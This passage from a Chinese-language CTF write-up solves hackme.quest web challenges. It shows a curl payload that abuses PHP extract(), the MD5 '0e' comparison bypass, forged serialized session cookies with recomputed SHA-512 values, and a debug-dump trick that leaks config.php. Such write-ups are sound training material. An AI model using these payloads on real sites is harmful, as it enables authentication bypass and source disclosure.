type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;User\u0026#34;\u0026gt; 68 \u0026lt;/div\u0026gt; 69 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 70 \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Pass:\u0026lt;/label\u0026gt; 71 \u0026lt;input id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; 72 \u0026lt;/div\u0026gt; 73 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 74 \u0026lt;input class=\u0026#34;form-control btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; 75 \u0026lt;/div\u0026gt; 76 77 \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;data\u0026#34; id=\u0026#34;login_data\u0026#34; value=\u0026#34;{}\u0026#34;\u0026gt; 78 \u0026lt;/form\u0026gt; 79 80 \u0026lt;div\u0026gt; 81 \u0026lt;p\u0026gt; 82 You can login with \u0026lt;code\u0026gt;guest\u0026lt;/code\u0026gt; / \u0026lt;code\u0026gt;guest\u0026lt;/code\u0026gt;. 83 \u0026lt;/p\u0026gt; 84 \u0026lt;/div\u0026gt; 85 86 \u0026lt;script\u0026gt; 87 form_login.onsubmit = function () { 88 login_data.value = JSON.stringify({ 89 username: username.value, 90 password: password.value 91 }); 92 username.value = null; 93 password.value = null; 94 }; 95 \u0026lt;/script\u0026gt; 96\u0026lt;?php else: ?\u0026gt; 97 \u0026lt;h3\u0026gt;Hi, \u0026lt;?=htmlentities($username)?\u0026gt;\u0026lt;/h3\u0026gt; 98 99 \u0026lt;h4\u0026gt;\u0026lt;?=sprintf(\u0026#34;You %s admin!\u0026#34;, $user == \u0026#39;admin\u0026#39; ? \u0026#34;are\u0026#34; : \u0026#34;are not\u0026#34;)?\u0026gt;\u0026lt;/h4\u0026gt; 100 101 \u0026lt;?php if($user == \u0026#39;admin\u0026#39;) printf(\u0026#34;\u0026lt;code\u0026gt;%s\u0026lt;/code\u0026gt;\u0026#34;, htmlentities($flag)); ?\u0026gt; 102\u0026lt;?php endif; ?\u0026gt; 103 \u0026lt;/div\u0026gt; 104 \u0026lt;/div\u0026gt; 105\u0026lt;/body\u0026gt; 106\u0026lt;/html\u0026gt; 這題有點多此一舉，驗證帳號密碼不依賴$_POST['username']及$_POST['password']，而是將其打包成json格式作為$_POST['data']送出。\n並且在接收時，做了個很危險的動作，就是使用extract() function。\n該 function 會將 json 當中的key作為變數名稱，value作為該變數的值在程式碼中直接使用。\n而要繞過得判斷式則有「$users[$username]」該用戶名稱必須存在於$users變數當中，以及「strcmp($users[$username], $password) == 0」該變數中的帳號的值與密碼相同。\n因此不難理解，只需要手動建立變數來覆蓋原本的設定檔即可，payload 大概會長這樣：\n1\u0026#34;data\u0026#34;:{ 2 \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, 3 \u0026#34;password\u0026#34;: \u0026#34;admin\u0026#34;, 4 \u0026#34;users\u0026#34;:{ 5 \u0026#34;admin\u0026#34;: \u0026#34;admin\u0026#34; 6 } 7} 發送封包：\n1curl -X POST -d \u0026#34;data={\\\u0026#34;username\\\u0026#34;:\\\u0026#34;admin\\\u0026#34;,\\\u0026#34;password\\\u0026#34;:\\\u0026#34;admin\\\u0026#34;,\\\u0026#34;users\\\u0026#34;:{\\\u0026#34;admin\\\u0026#34;:\\\u0026#34;admin\\\u0026#34;}}\u0026#34; https://ctf.hackme.quest/login6/ 1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Login As Admin 6\u0026lt;/title\u0026gt; 6 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 7 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 8\u0026lt;/head\u0026gt; 9\u0026lt;body\u0026gt; 10 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 12 \u0026lt;h1\u0026gt;Login as Admin 6\u0026lt;/h1\u0026gt; 13 \u0026lt;/div\u0026gt; 14 \u0026lt;/div\u0026gt; 15 16 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 17 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 18 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 19 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 20 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 21 \u0026lt;/div\u0026gt; 22 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 23 \u0026lt;li\u0026gt; 24 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 25 \u0026lt;/li\u0026gt; 26 \u0026lt;li\u0026gt; 27 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 28 \u0026lt;/li\u0026gt; 29 \u0026lt;/ul\u0026gt; 30 \u0026lt;/div\u0026gt; 31 \u0026lt;/div\u0026gt; 32 \u0026lt;/div\u0026gt; 33 34 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 35 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 36 \u0026lt;h3\u0026gt;Hi, admin\u0026lt;/h3\u0026gt; 37 38 \u0026lt;h4\u0026gt;You are admin!\u0026lt;/h4\u0026gt; 39 40 \u0026lt;code\u0026gt;FLAG{Oops, I fucked up your user database}\u0026lt;/code\u0026gt; \u0026lt;/div\u0026gt; 41 \u0026lt;/div\u0026gt; 42\u0026lt;/body\u0026gt; 43\u0026lt;/html\u0026gt; Flag FLAG{Oops, I fucked up your user database}\n28. login as admin 7 # login as admin\nSource code:\n1\u0026lt;?php 2require(\u0026#39;config.php\u0026#39;); 3 4if($_GET[\u0026#39;show_source\u0026#39;] === \u0026#39;1\u0026#39;) { 5 highlight_file(__FILE__); 6 exit; 7} 8 9if($_POST[\u0026#39;name\u0026#39;] == \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; md5($_POST[\u0026#39;password\u0026#39;]) == \u0026#39;00000000000000000000000000000000\u0026#39;) { 10 // admin account is disabled by give a impossible md5 hash 11 $user = \u0026#39;admin\u0026#39;; 12} elseif($_POST[\u0026#39;name\u0026#39;] == \u0026#39;guest\u0026#39; \u0026amp;\u0026amp; md5($_POST[\u0026#39;password\u0026#39;]) == \u0026#39;084e0343a0486ff05530df6c705c8bb4\u0026#39;) { 13 $user = \u0026#39;guest\u0026#39;; 14} elseif(isset($_POST[\u0026#39;name\u0026#39;])) { 15 $user = false; 16} 17?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 18\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 19\u0026lt;head\u0026gt; 20 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 21 \u0026lt;title\u0026gt;Login As Admin 7\u0026lt;/title\u0026gt; 22 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 23 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 24\u0026lt;/head\u0026gt; 25\u0026lt;body\u0026gt; 26 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 27 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 28 \u0026lt;h1\u0026gt;Login as Admin 7\u0026lt;/h1\u0026gt; 29 \u0026lt;/div\u0026gt; 30 \u0026lt;/div\u0026gt; 31 32 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 33 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 34 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 35 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 36 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 37 \u0026lt;/div\u0026gt; 38 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 39 \u0026lt;li\u0026gt; 40 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 41 \u0026lt;/li\u0026gt; 42 \u0026lt;li\u0026gt; 43 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 44 \u0026lt;/li\u0026gt; 45 \u0026lt;/ul\u0026gt; 46 \u0026lt;/div\u0026gt; 47 \u0026lt;/div\u0026gt; 48 \u0026lt;/div\u0026gt; 49 50 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 51 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 52\u0026lt;?php if($user === false): ?\u0026gt; 53 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; 54\u0026lt;?php elseif($user === \u0026#39;admin\u0026#39;): ?\u0026gt; 55 \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;Hello, admin! Here is your flag: \u0026lt;code\u0026gt;\u0026lt;?=$flag?\u0026gt;\u0026lt;/code\u0026gt;\u0026lt;/div\u0026gt; 56\u0026lt;?php elseif($user): ?\u0026gt; 57 \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;You are not admin, no flag for you! :P\u0026lt;/div\u0026gt; 58\u0026lt;?php else: ?\u0026gt; 59 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 60 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 61 \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;User:\u0026lt;/label\u0026gt; 62 \u0026lt;input id=\u0026#34;name\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;User\u0026#34;\u0026gt; 63 \u0026lt;/div\u0026gt; 64 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 65 \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Pass:\u0026lt;/label\u0026gt; 66 \u0026lt;input id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; 67 \u0026lt;/div\u0026gt; 68 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 69 \u0026lt;input class=\u0026#34;form-control btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; 70 \u0026lt;/div\u0026gt; 71 \u0026lt;/form\u0026gt; 72\u0026lt;?php endif; ?\u0026gt; 73 \u0026lt;/div\u0026gt; 74 \u0026lt;/div\u0026gt; 75\u0026lt;/body\u0026gt; 76\u0026lt;/html\u0026gt; 這題也是使用==來作為判斷，其目標很明顯是要想辦法通過「md5($_POST['password']) == '00000000000000000000000000000000'」該判斷。\n要真的雜湊出00000000000000000000000000000000似乎不太可能，但我們可以利用==的弱比對特性。\n這題正是我在 25題login as admin 3中所說「這會讓我想到著名的 PHP 處理 MD5 的 0e 開頭字串總是判斷為0的特性。(使用==情況下)」\n我們只需要想辦法將雜湊出來的結果為0e開頭，PHP 就會在弱比對當中將它視同0，該判斷式就可以繞過了。\n至於原理，PHP 是允許使用科學記號表示數字的，而「e(或大寫E)」表示以10為底數，後方接著為次方數。\n(例如1.2*10^3可以寫作1.2e3)\n所以很明顯的，0e後方不管是什麼，一旦 PHP 將它當作數字看待，那它就會成為0*10^?，自然為0。\n最後數字0使用弱比對==將會與字串'00000000000000000000000000000000'等價。\n怎麼搞出 MD5 雜湊為0e開頭的值？\n這個網路上已經整理出一堆了，基本上只要 google「php md5 0e」就可以看到了。\n於是 Flag 出現FLAG{Scientific notation is awesome!!!}\n29. login as admin 8 # login as admin\n這題可以不太需要看原始碼。\n在登入頁面時，會發現系統生成兩個cookie，分別叫做「login8cookie」及「login8sha512」。\nlogin8cookie值為：\nO%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D 經過URL decode後，會得到以下資訊：\nO:7:\u0026#34;Session\u0026#34;:6:{s:14:\u0026#34;Sessiondebug\u0026#34;;b:0;s:19:\u0026#34;Sessiondebug_dump\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:13:\u0026#34;Sessiondata\u0026#34;;a:0:{}s:4:\u0026#34;user\u0026#34;;s:0:\u0026#34;\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:0:\u0026#34;\u0026#34;;s:8:\u0026#34;is_admin\u0026#34;;b:0;} 而這段資訊拿去sha512雜湊後會得到login8sha512的值。\n要特別注意的是，這題不要 URL decode 之後再 hash，這會導致一些不可視字元的丟失。(例如%00)\n試著先用guest登入，觀察資料變化。\nlogin8cookie：\nO%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A2%3A%7Bs%3A8%3A%22password%22%3Bs%3A5%3A%22guest%22%3Bs%3A5%3A%22admin%22%3Bb%3A0%3B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D URL decode\nO:7:\u0026#34;Session\u0026#34;:6:{s:14:\u0026#34;Sessiondebug\u0026#34;;b:0;s:19:\u0026#34;Sessiondebug_dump\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:13:\u0026#34;Sessiondata\u0026#34;;a:2:{s:8:\u0026#34;password\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:5:\u0026#34;admin\u0026#34;;b:0;}s:4:\u0026#34;user\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:8:\u0026#34;is_admin\u0026#34;;b:0;} 會發現，原本未登入時資料顯示s:4:\u0026quot;user\u0026quot;;s:0:\u0026quot;\u0026quot;;，登入後顯示s:4:\u0026quot;user\u0026quot;;s:5:\u0026quot;guest\u0026quot;;。\n大概可以得知，會利用該值驗證使用者為何，並且s:後方為byte數，例如guest為5 bytes。\n另外，有個值很明顯是在判斷是否為管理員s:8:\u0026quot;is_admin\u0026quot;;b:0;，因為我們只是登入guest，所以與登入前一樣沒變。\n知道規則之後就可以開始更改了，將s:4:\u0026quot;user\u0026quot;;s:0:\u0026quot;\u0026quot;;改為s:4:\u0026quot;user\u0026quot;;s:5:\u0026quot;admin\u0026quot;;，並且將s:8:\u0026quot;is_admin\u0026quot;;b:0;改為s:8:\u0026quot;is_admin\u0026quot;;b:1;。\nPayload：\nO:7:\u0026#34;Session\u0026#34;:6:{s:14:\u0026#34;Sessiondebug\u0026#34;;b:0;s:19:\u0026#34;Sessiondebug_dump\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:13:\u0026#34;Sessiondata\u0026#34;;a:0:{}s:4:\u0026#34;user\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:0:\u0026#34;\u0026#34;;s:8:\u0026#34;is_admin\u0026#34;;b:1;} 經過 URL encode 之後塞回去login8cookie：\nO%3A7%3A%22Session%22%3A9%3A%7Bs%3A14%3A%22%00Session%00debug%22%3BN%3Bs%3A19%3A%22%00Session%00debug_dump%22%3BN%3Bs%3A13%3A%22%00Session%00data%22%3BN%3Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3Bs%3A14%3A%22.Session.debug%22%3Bb%3A0%3Bs%3A19%3A%22.Session.debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22.Session.data%22%3Ba%3A0%3A%7B%7D%7D 別忘了將它sha512雜湊後也塞回login8sha512：\n0f1c4e335966843c9008cfc8055d198734a6373bd54853dd65987608bfcb764b05f08ec23e5b3a3d458528991f93c200c9a2fb3b88f4c7f2d07430480df846ac Flag FLAG{object injection G____G}\n30. login as admin 8.1 # login as admin and grab the hidden flag\n基本上就是上一題中，有另外一個隱藏的 flag，找到它。\nSource code:\n1\u0026lt;?php 2require(\u0026#39;config.php\u0026#39;); 3require(\u0026#39;session.php\u0026#39;); 4 5// class Session { ... } 6 7// sorry, no source code this time. :P 8 9$session = Session::load(); 10$login_failed = false; 11 12if($_GET[\u0026#39;show_source\u0026#39;] === \u0026#39;1\u0026#39;) { 13 highlight_file(__FILE__); 14 exit; 15} 16 17if($_GET[\u0026#39;debug\u0026#39;] === \u0026#39;1\u0026#39;) { 18 $session-\u0026gt;debug(); 19} 20 21if(isset($_POST[\u0026#39;name\u0026#39;])) { 22 $login_failed = !Session::login($_POST[\u0026#39;name\u0026#39;], $_POST[\u0026#39;password\u0026#39;]); 23} else if(isset($_POST[\u0026#39;logout\u0026#39;])) { 24 $session = new Session(); 25} 26 27$session-\u0026gt;save(); 28?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 29\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 30\u0026lt;head\u0026gt; 31 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 32 \u0026lt;title\u0026gt;Login As Admin 8\u0026lt;/title\u0026gt; 33 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 34 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 35\u0026lt;/head\u0026gt; 36\u0026lt;body\u0026gt; 37 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 38 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 39 \u0026lt;h1\u0026gt;Login as Admin 8\u0026lt;/h1\u0026gt; 40 \u0026lt;/div\u0026gt; 41 \u0026lt;/div\u0026gt; 42 43 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 44 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 45 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 46 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 47 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 48 \u0026lt;/div\u0026gt; 49 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 50 \u0026lt;li\u0026gt; 51 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 52 \u0026lt;/li\u0026gt; 53 \u0026lt;li\u0026gt; 54 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 55 \u0026lt;/li\u0026gt; 56 \u0026lt;/ul\u0026gt; 57 \u0026lt;/div\u0026gt; 58 \u0026lt;/div\u0026gt; 59 \u0026lt;/div\u0026gt; 60 61 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 62 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 63\u0026lt;?php if($login_failed): ?\u0026gt; 64\u0026lt;?php if($_POST[\u0026#39;name\u0026#39;] === \u0026#39;admin\u0026#39;): ?\u0026gt; 65 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Nice try. Login failed\u0026lt;/div\u0026gt; 66\u0026lt;?php else: ?\u0026gt; 67 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; 68\u0026lt;?php endif; ?\u0026gt; 69\u0026lt;?php elseif($session-\u0026gt;is_admin): ?\u0026gt; 70 \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;Hello, admin! Here is your flag: \u0026lt;code\u0026gt;\u0026lt;?=$flag?\u0026gt;\u0026lt;/code\u0026gt;\u0026lt;/div\u0026gt; 71\u0026lt;?php elseif($session-\u0026gt;user): ?\u0026gt; 72 \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;Hello, \u0026lt;?=$session-\u0026gt;user?\u0026gt;. You are not admin, no flag for you! :P\u0026lt;/div\u0026gt; 73\u0026lt;?php endif; ?\u0026gt; 74 75\u0026lt;?php if($session-\u0026gt;user): ?\u0026gt; 76 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 77 \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;logout\u0026#34; value=\u0026#34;true\u0026#34;\u0026gt; 78 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 79 \u0026lt;input class=\u0026#34;form-control btn btn-danger\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Logout\u0026#34;\u0026gt; 80 \u0026lt;/div\u0026gt; 81 \u0026lt;/form\u0026gt; 82\u0026lt;?php else: ?\u0026gt; 83 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 84 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 85 \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;User:\u0026lt;/label\u0026gt; 86 \u0026lt;input id=\u0026#34;name\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;User\u0026#34;\u0026gt; 87 \u0026lt;/div\u0026gt; 88 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 89 \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Pass:\u0026lt;/label\u0026gt; 90 \u0026lt;input id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; 91 \u0026lt;/div\u0026gt; 92 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 93 \u0026lt;input class=\u0026#34;form-control btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; 94 \u0026lt;/div\u0026gt; 95 \u0026lt;/form\u0026gt; 96\u0026lt;?php endif; ?\u0026gt; 97 \u0026lt;/div\u0026gt; 98 \u0026lt;/div\u0026gt; 99\u0026lt;/body\u0026gt; 100\u0026lt;/html\u0026gt; 會發現可以透過$_GET['debug']===1來啟用「$session-\u0026gt;debug()」功能。\n通常在做滲透測試時，如果拿到了系統 debug 工具的使用權限，那麼通常可以輕易獲得許多敏感資料。\n先嘗試觸發看看https://ctf.hackme.quest/login8/?debug=1：\n看來沒那麼容易。\n未登入的login8cookie:\nO%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D URL decode 之後：\nO:7:\u0026#34;Session\u0026#34;:6:{s:14:\u0026#34;Sessiondebug\u0026#34;;b:0;s:19:\u0026#34;Sessiondebug_dump\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:13:\u0026#34;Sessiondata\u0026#34;;a:0:{}s:4:\u0026#34;user\u0026#34;;s:0:\u0026#34;\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:0:\u0026#34;\u0026#34;;s:8:\u0026#34;is_admin\u0026#34;;b:0;} sha512:\n4feb33685e47c83ce089b1707f270001a8dc0648d4a7d94d0a3e2f5b35803a7c8766285283415c8594e658468cf5e99be232b3bf98a441568a71f709243e9077 再仔細看看，會發現有一段長這樣：s:14:\u0026quot;.Session.debug\u0026quot;;b:0;\n得到管理員身份後，同時把這值改為1再嘗試一次(別忘了 sha512 也要改)\nlogin8cookie:\nO%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D URL decode:\nO:7:\u0026#34;Session\u0026#34;:6:{s:14:\u0026#34;Sessiondebug\u0026#34;;b:1;s:19:\u0026#34;Sessiondebug_dump\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:13:\u0026#34;Sessiondata\u0026#34;;a:0:{}s:4:\u0026#34;user\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;is_admin\u0026#34;;b:1;} login8sha512:\n2ad02054b592c0e8f5ac53dd264901e74818821f54afe11694bc6782f14d1bd2d1eca947367affa0cdb3cb99e63737ead8300ac626b6f962eb5d7992ccc9de03 這時候可以得到index.php的原始碼：\n猜測s:19:\u0026quot;Sessiondebug_dump\u0026quot;;s:9:\u0026quot;index.php\u0026quot;;是用來選擇要 dump source code 的檔案，改成config.php試試，並且記得更改byte(index.php為9，config.php為10)。\n就可以看到config.php的 source code 了\nPayload\nO%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D 820cfbefb738a1646ca43ed05946f8b8e733435956528948270292c16ed9eca6752e0d0ffdde6eea4594c6b516eb41e364b9a801fa552dff3a68ec9ce98f6813 Flag FLAG{wake up neo}\n31. dafuq-manager 1 # Login as guest and find flag 1\n「dafuq」是網路用語，意思是「WTF(what the fuck)」，題目「dafuq manager」大致上意思是「這管理者到底在幹麻！？」。\n這是一個登入頁面，先按照提示所說登入guest帳號：\n裡面是個管理檔案的界面：\n在觀察過後可以發現，產生了一個 cookie 叫做「show_hidden」其值為no。\n追隨本性，改成yes，就可以看到頁面上的隱藏檔案「.good.job.here.is.your.hidden.flag-1.txt」：\n打開就可以看到 flag FLAG{Wow, how did you found me? I was hidden!}。\n32. dafuq-manager 2 # Login as admin, code review and get flag 2\n上一題可以看到還有一個隱藏檔案「.where-is-flag-2-please-tell-me.txt」，這是這題的提示：\n裡面寫著：「Try to login as admin! and you will get flag2」\n開始嘗試撈管理員的帳號密碼。\n我們可以下載目錄下的dafuqManager.7z來了解整個系統的架構。\nSource code of index.php:\n1\u0026lt;?php 2ini_set(\u0026#39;memory_limit\u0026#39;, \u0026#39;16M\u0026#39;); 3ini_set(\u0026#39;upload_max_filesize\u0026#39;, \u0026#39;1k\u0026#39;); 4error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING); 5define(\u0026#39;ROOT\u0026#39;, dirname(realpath(__FILE__))); 6umask(002); 7require \u0026#34;./core/init.php\u0026#34;; 8switch ($GLOBALS[\u0026#34;action\u0026#34;]) { 9 // EDIT FILE 10 11 case \u0026#34;edit\u0026#34;: 12 require \u0026#34;./core/fun_edit.php\u0026#34;; 13 edit_file($GLOBALS[\u0026#34;dir\u0026#34;], $GLOBALS[\u0026#34;item\u0026#34;]); 14 break; 15 // DELETE FILE(S)/DIR(S) 16 17 case 